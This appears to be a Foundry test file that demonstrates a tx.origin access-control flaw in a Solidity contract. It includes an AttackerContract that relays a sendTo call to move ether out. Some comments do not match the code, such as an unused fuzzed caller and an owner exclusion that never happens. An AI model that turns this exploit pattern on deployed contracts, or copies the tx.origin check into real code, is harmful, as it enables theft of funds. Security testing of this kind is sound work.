
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MyContract} from "../src/MyContract.sol";

contract TestAccessControlMyContract is Test {

    MyContract myContract;
    address owner;

    function setUp() public {
        owner = address(this);
        myContract = new MyContract();
        // Fund the contract so it has balance to transfer
        vm.deal(address(myContract), 10 ether);
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself.
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));

        // Exclude Foundry Internals (Dynamic)
        vm.assume(caller != address(vm)); 
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Exclude the owner (the deployer of MyContract, which is this test contract)
        // The vulnerability is that tx.origin is checked instead of msg.sender
        // This means any contract called by the owner can call sendTo

        // --- 2. State Configuration ---
        
        // Create a malicious intermediary contract that will call sendTo
        // The caller will deploy this contract, but when called through the owner's transaction
        // tx.origin will be the owner, bypassing the access control
        
        // For this test, we simulate an attack where:
        // 1. The owner (this test contract) initiates a transaction
        // 2. The caller (an arbitrary address's contract) is called in between
        // 3. That contract calls myContract.sendTo()
        // Since tx.origin == owner, the check passes even though msg.sender is not owner

        address payable receiver = payable(address(0xBEEF));
        uint256 amount = 1 ether;
        
        uint256 receiverBalanceBefore = receiver.balance;
        uint256 contractBalanceBefore = address(myContract).balance;

        // --- 3. Execution & Assertion ---
        
        // Deploy an attacker contract from the arbitrary caller
        AttackerContract attacker = new AttackerContract(address(myContract));
        
        // The vulnerability: when the owner calls the attacker contract,
        // and the attacker contract calls myContract.sendTo(),
        // tx.origin is still the owner, so the check passes
        // This demonstrates that access control via tx.origin is flawed
        
        // Simulate: owner (this contract) calls attacker.attack()
        // tx.origin = owner, msg.sender to myContract = attacker
        attacker.attack(receiver, amount);

        // Assert that the transfer actually happened
        assertEq(receiver.balance, receiverBalanceBefore + amount, "Receiver should have received funds");
        assertEq(address(myContract).balance, contractBalanceBefore - amount, "Contract balance should decrease");
    }
}

// Attacker contract that exploits the tx.origin vulnerability
contract AttackerContract {
    MyContract target;
    
    constructor(address _target) {
        target = MyContract(_target);
    }
    
    function attack(address payable receiver, uint256 amount) external {
        // When this is called by the owner, tx.origin == owner
        // So the require(tx.origin == owner) check passes
        // even though msg.sender is this attacker contract
        target.sendTo(receiver, amount);
    }
}
